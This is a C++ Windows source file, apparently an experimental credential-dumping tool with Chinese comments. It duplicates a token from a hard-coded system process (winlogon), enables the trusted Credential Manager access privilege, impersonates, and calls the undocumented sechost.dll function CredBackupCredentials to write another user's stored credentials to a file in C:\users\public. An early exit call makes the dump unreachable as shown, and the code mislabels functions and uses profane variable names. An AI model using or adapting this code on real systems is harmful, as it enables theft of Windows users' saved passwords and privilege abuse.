// ConsoleApplication1.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <Windows.h>
#include <iostream>
#include <tlhelp32.h>

typedef
BOOL
(NTAPI* PNT_QUEUE_APC_THREAD)(HANDLE Token,
    LPCWSTR Path,
    PVOID Password,
    DWORD PasswordSize,
    DWORD Flags
    );

PNT_QUEUE_APC_THREAD NtQueueApcThread;
// 强制按照4bytes对齐
#pragma pack (4)
typedef struct _Unknown_CCD68 {
    DWORD   _0h;  	// 8
    DWORD   _4h;  	// 3
    DWORD   _8h;  	// 0
    DWORD   _Ch;  	// 返回之后赋值，APP2_tid，当前的app2的线程id
    BYTE    _10h; 	// 0
    BYTE fuckyou123[0x1f];
    DWORD64   _30h; 	// 出来之后给_30h字段赋了个值，App——pid，这里是在返回之后赋的值
    DWORD   _38h; 	// 0
    DWORD   _3Ch; 	// 0xB
    DWORD   _40h; 	// 4
    DWORD64   _44h; 	// 3
    DWORD   _4Ch; 	// access_mask  0x1410
    DWORD   _50h; 	// 4
    DWORD64   _54h; 	// 9
    DWORD   _5Ch; 	// app2_pid
    DWORD   _60h; 	// SID长度
    DWORD64   _64h; 	// 7
    //DWORD64   _6Ch; 	// SID（这里存的是sid实际的值，并非地址，长度为_60h指示的值）
    // 下一个字段的偏移量是 0x60+poi(_60h)
    BYTE fuckyou456[0xc];
    DWORD   _78h; 	// 4
    DWORD64   _7Ch; 	// 0xA
    DWORD   _84h; 	// lsass_pid
    DWORD   _88h; 	// 4
    DWORD64   _8Ch; 	// 0x14
    DWORD   _94h; 	// 0
    DWORD   _98h; 	// 8
    DWORD64   _9Ch; 	// 0x4EE
    DWORD64   _A4h; 	// rbp+var_30
    DWORD   _ACh; 	// 8
    DWORD64   _B0h; 	// 0x4EC
    DWORD64   _B8h; 	// rbp+var_28
    DWORD   _C0h; 	// 4
    DWORD64   _C4h; 	// 0x4F3
    DWORD   _CCh; 	// lsass父进程PID
    DWORD   _D0h; 	// 4
    DWORD64   _D4h; 	// 0x4F2
    DWORD   _DCh; 	// APP2的integrity level
    DWORD   _E0h; 	// 8
    DWORD64   _E4h; 	// 0x1D
    DWORD64   _ECh; 	// app2的authenticationID
    DWORD   _F4h; 	// 4
    DWORD64   _F8h; 	// 0x41
    DWORD   _100h;	// 0
}Unknown_CCD68;
int main()
{
    Unknown_CCD68 fuckyou = {};
    ZeroMemory(&fuckyou, sizeof(Unknown_CCD68));
    fuckyou._0h = 8;
    fuckyou._4h = 3;
    fuckyou._8h = 0;
    //fuckyou._Ch=返回之后赋值，APP2_tid，当前的app2的线程id;
    fuckyou._10h = 0;
    //fuckyou._30h=出来之后给_30h字段赋了个值，App——pid，这里是在返回之后赋的值;
    fuckyou._38h = 0;
    fuckyou._3Ch = 0xB;
    fuckyou._40h = 4;
    fuckyou._44h = 3;
    //fuckyou._4Ch=access_mask  0x1410;
    fuckyou._50h = 4;
    fuckyou._54h = 9;
    //fuckyou._5Ch=app2_pid;
    fuckyou._60h = 0xc;
    fuckyou._64h = 7;
    //fuckyou._6Ch=SID（这里存的是sid实际的值，并非地址，长度为_60h指示的值）;
    fuckyou._78h = 4;
    fuckyou._7Ch = 0xA;
    //fuckyou._84h=lsass_pid;
    fuckyou._88h = 4;
    fuckyou._8Ch = 0x14;
    fuckyou._94h = 0;
    fuckyou._98h = 8;
    fuckyou._9Ch = 0x4EE;
    //fuckyou._A4h=rbp+var_30;
    fuckyou._ACh = 8;
    fuckyou._B0h = 0x4EC;
    //fuckyou._B8h=rbp+var_28;
    fuckyou._C0h = 4;
    fuckyou._C4h = 0x4F3;
    //fuckyou._CCh=lsass父进程PID;
    fuckyou._D0h = 4;
    fuckyou._D4h = 0x4F2;
    //fuckyou._DCh=APP2的integrity level;
    fuckyou._E0h = 8;
    fuckyou._E4h = 0x1D;
    //、、fuckyou._ECh=app2的authenticationID;
    fuckyou._F4h = 4;
    fuckyou._F8h = 0x41;
    fuckyou._100h = 0;

    DWORD rdx = 0x40;
    char* pfuckyou = ((char*)&fuckyou)+ rdx;
    printf("%x\n", sizeof(fuckyou._40h));
    printf("%x\n", &fuckyou._3Ch);
    printf("%x\n", &fuckyou._40h);
    printf("%x\n", &fuckyou._44h);
    printf("%x\n", &fuckyou._4Ch);
    DWORD ecx = 0xa;
    DWORD edi = 0;
    while (1) {
        DWORD64 temp = *(DWORD64*)(pfuckyou + 4);
        printf("temp value: %x\n", temp);
        if (temp == ecx) break;
        DWORD eax = *(DWORD*)pfuckyou;
        edi++;
        rdx += 0xc;
        rdx += eax;
        pfuckyou = ((char*)&fuckyou)+ rdx;
        if (edi >= 0xb)break;
    }


    exit(-1);
    HMODULE asdasdasda = LoadLibraryA("sechost.dll");
    //	HMODULE NtdllHandle = GetModuleHandleA("sechost.dll");
    printf("%x\n", asdasdasda);
    NtQueueApcThread = (PNT_QUEUE_APC_THREAD)GetProcAddress(asdasdasda, "CredBackupCredentials");
    printf("%x\n", NtQueueApcThread);
	 /*
	 HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwProcessId
);
	 */
	HANDLE handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, 824);
    HANDLE handlenotepad = OpenProcess(PROCESS_ALL_ACCESS, false, 13088);

    HANDLE hTokennotepad;
    OpenProcessToken(handlenotepad, TOKEN_ALL_ACCESS, &hTokennotepad);
        printf("get current user token success\n");
        /*
        * typedef
BOOL
(NTAPI* PNT_QUEUE_APC_THREAD)(HANDLE Token,
    LPCWSTR Path,
    PVOID Password,
    DWORD PasswordSize,
    DWORD Flags
    );
                                */
	HANDLE hToken;
	if (OpenProcessToken(handle, TOKEN_DUPLICATE, &hToken)) {
		// Token successfully opened
		// You can now use hToken to perform operations on the token
		printf("get winlogon process token succeed\n");

		// 复制token
		HANDLE hNewToke2n;
		if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hNewToke2n)) {
			// Token successfully duplicated
			// You can now use hNewToken to perform operations on the new token
            bool bResult = true;
            if (bResult)
            {
                // Step 2: Enable a privilege
                HANDLE hProcess = GetCurrentProcess();
                HANDLE hToken23 = NULL;
                bResult = OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken23);
                if (bResult)
                {
                    LUID PrivilegeRequired;
                    BOOL bRes = FALSE;

                    bRes = LookupPrivilegeValue(NULL, SE_TRUSTED_CREDMAN_ACCESS_NAME, &PrivilegeRequired);
                    TOKEN_PRIVILEGES tp;
                    tp.PrivilegeCount = 1;
                    tp.Privileges[0].Luid = PrivilegeRequired;
                    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                    bResult = AdjustTokenPrivileges(hNewToke2n, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
                    if (bResult)
                    {
                       bool ret =ImpersonateLoggedOnUser(hNewToke2n);
                        if (ret == FALSE) {
                            printf("ImpersonateLoggedOnUser failed, %d\n", GetLastError());
                            return 0;
                        }
                        printf("impersonate success\n");
                        system("pause");
                       // 用户token应该可以从改用户的进程中获取到
                        // 我使用当前用户的身份启动了一个notepad
                        
                           
                            bool asdqwe = NtQueueApcThread(hTokennotepad, L"C:\\users\\public\\1.txt", NULL, 0, 0);
                            if (asdqwe) {
                                printf("cred dump succeed\n");
                            }
                            else {

                                printf("cred dump failed\n");
                                printf("error code: %x\n",GetLastError());
                            }
                      
                    }
                    CloseHandle(hToken23);
                }
                RevertToSelf();
            }
            CloseHandle(hNewToke2n);
		}
        CloseHandle(hToken);
	}

}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
